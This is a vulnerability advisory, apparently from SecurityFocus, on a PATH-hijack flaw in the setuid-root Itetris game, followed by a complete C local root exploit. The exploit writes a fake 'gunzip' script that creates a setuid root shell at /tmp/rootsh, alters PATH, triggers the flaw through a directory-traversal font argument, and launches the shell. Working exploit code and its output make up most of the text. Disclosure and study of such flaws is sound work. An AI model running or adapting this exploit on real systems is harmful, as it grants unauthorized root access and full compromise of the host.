source: http://www.securityfocus.com/bid/2139/info

Itetris, or "Intelligent Tetris", is a clone of the popular Tetris puzzle game for linux systems. The svgalib version of Itetris is installed setuid root so that it may access video hardware when run by a regular user. Itetris contains a vulnerability which may allow unprivileged users to execute arbitrary commands as root.

Itetris uses the system() function to execute gunzip when uncompressing font files. Unfortuntely it does so in a very insecure way -- relying on gunzip being located in directories specified in the PATH environment variable. It is possible to exploit this vulnerability if an attacker sets PATH to include a directory under his/her control in which a "gunzip" is found instead of or before the real location, eg:

PATH=/tmp/hacker:$PATH

Any program with the filename "gunzip" in /tmp/hacker would then be executed with Itetris' effective privileges. This vulnerability can be exploited to gain super user access and completely compromise the victim host.


/* (*)itetris[v1.6.2] local root exploit, by: v9[v9@fakehalo.org].  this will
   give you root on systems that have the itetris game installed.  the program
   is installed setuid(0)/root due to svgalib.  this exploits a system() call
   mixed with bad ../ protection, which makes this possible -- considering it
   needs a font file to end with ".gz" to run gunzip.

   explaination(egafont.c):
   ---------------------------------------------------------------------------
   [199/360]:char *FontPath, *FontPath1;
   ...
   [237/360]:unzipped = strcasecmp(FontPath+fontheight-3, ".gz");
   ...
   [246/360]:sprintf(FontPath1, "gunzip -c %s > %s", FontPath, tmp_file_name);
   [247/360]:system(FontPath1);
   ---------------------------------------------------------------------------
   
   example:
   ---------------------------------------------------------------------------
   # cc xitetris.c -o xitetris  
   # ./xitetris
   [ (*)itetris[v1.6.2] local root exploit, by: v9[v9@fakehalo.org]. ]
   [*] checking /usr/local/bin/itetris for proper file permissions.
   [*] done, /usr/local/bin/itetris appears to be setuid.
   [*] done, making temporary files.
   [*] done, setting up environment variable(s).
   [*] done, launching /usr/local/bin/itetris. (the screen may blink locally)
   [*] done, cleaning up temporary files.
   [*] done, checking /tmp/rootsh for proper file permissions.
   [*] success! /tmp/rootsh appears to be set*id.
   [?] do you wish to enter the rootshell now(y/n)?: y
   [*] ok, executing rootshell(/tmp/rootsh) now.
   # 
   ---------------------------------------------------------------------------
*/
#define PATH            "/usr/local/bin/itetris"        // path to itetris.
#define APPENDPATH      "/tmp"                          // tmp dir to use.
#define EXECFILE        "gunzip"                        // don't change this.
#define FAKEFILE        "xitetris.gz"                   // must end with .gz.
#define SUIDSHELL       "/tmp/rootsh"                   // root shell location.
#include <stdio.h>
#include <sys/stat.h>
main(){
 char cmd[256],tmpfile[256],fakefile[256],path[1024],input[0];
 struct stat mod1,mod2;
 FILE *suidexec,*fakegz;
 fprintf(stderr,"[ (*)itetris[v1.6.2] local root exploit, by: v9[v9@fakehalo.o"
 "rg]. ]\n");
 fprintf(stderr,"[*] checking %s for proper file permissions.\n",PATH);
 if(stat(PATH,&mod1)){
  fprintf(stderr,"[!] failed, %s doesnt appear to exist.\n",PATH);
  exit(1);
 }
 else if(mod1.st_mode==35309){
  fprintf(stderr,"[*] done, %s appears to be setuid.\n",PATH);
 }
 else{
  fprintf(stderr,"[!] failed, %s doesn't appear to be setuid.\n",PATH);
  exit(1);
 }
 fprintf(stderr,"[*] done, making temporary files.\n");
 snprintf(fakefile,sizeof(fakefile),"%s/%s",APPENDPATH,FAKEFILE);
 snprintf(tmpfile,sizeof(tmpfile),"%s/%s",APPENDPATH,EXECFILE);
 unlink(fakefile);fakegz=fopen(fakefile,"w");fclose(fakegz);
 unlink(tmpfile);suidexec=fopen(tmpfile,"w");
 fprintf(suidexec,"#!/bin/sh\n");
 fprintf(suidexec,"cp /bin/sh %s\n",SUIDSHELL);
 fprintf(suidexec,"chown 0.0 %s\n",SUIDSHELL);
 fprintf(suidexec,"chmod 6755 %s\n",SUIDSHELL);
 fclose(suidexec);
 chmod(tmpfile,33261);
 fprintf(stderr,"[*] done, setting up environment variable(s).\n");
 snprintf(path,sizeof(path),"%s:%s",APPENDPATH,getenv("PATH"));
 setenv("PATH",path,1);
 fprintf(stderr,"[*] done, launching %s. (the screen may blink locally)\n",
 PATH);
 sleep(1);
 snprintf(cmd,sizeof(cmd),"%s -VE -F../../../../%s/%s 1>/dev/null 2>&1",PATH,
 APPENDPATH,FAKEFILE);
 system(cmd);
 fprintf(stderr,"[*] done, cleaning up temporary files.\n");
 unlink(fakefile);unlink(tmpfile);
 fprintf(stderr,"[*] done, checking %s for proper file permissions.\n",
 SUIDSHELL);
 if(stat(SUIDSHELL,&mod2)){
  fprintf(stderr,"[!] failed, %s doesnt appear to exist.\n",SUIDSHELL);
  exit(1);
 }
 else if(mod2.st_mode==36333){
  fprintf(stderr,"[*] success! %s appears to be set*id.\n",SUIDSHELL);
 }
 else{
  fprintf(stderr,"[!] failed, %s doesn't appear to be set*id.\n",SUIDSHELL);
  exit(1);
 }
 fprintf(stderr,"[?] do you wish to enter the rootshell now(y/n)?: ");
 scanf("%s",input);
 if(input[0]!=0x59&&input[0]!=0x79){
  printf("[*] aborted, the rootshell is: %s.\n",SUIDSHELL);
 }
 else{
  printf("[*] ok, executing rootshell(%s) now.\n",SUIDSHELL);
  execl(SUIDSHELL,SUIDSHELL,0);
 }
 fprintf(stderr,"[*] exiting program successfully.\n");
 exit(0);
}

